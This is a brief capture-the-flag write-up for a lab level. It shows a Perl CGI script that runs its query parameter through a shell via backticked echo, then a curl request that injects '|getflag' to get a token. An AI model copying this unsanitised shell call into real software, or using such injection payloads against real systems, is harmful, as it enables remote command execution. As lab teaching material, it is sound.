level04.pl is a perl cgi script taking one query parameter named x.

Running on 10.12.177.116:4747 by flag04 user 

     1  #!/usr/bin/perl
     2  # localhost:4747
     3  use CGI qw{param};
     4  print "Content-type: text/html\n\n";
     5  sub x {
     6    $y = $_[0];
     7    print `echo $y 2>&1`;
     8  }
     9  x(param("x"));

It execute the the command echo with our parameter 


If we curl into localhost:4747/?x=hello we get hello back

`[~]$ curl http://10.12.177.116:4747/\?x\=hello`
hello
`[~]$`

Now Let's try and inject the getflag command into the x query parameter and see if we can get the flag

`[~]$ curl http://10.12.177.116:4747/\?x\=hello\|getflag`

# Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap

`[~]$`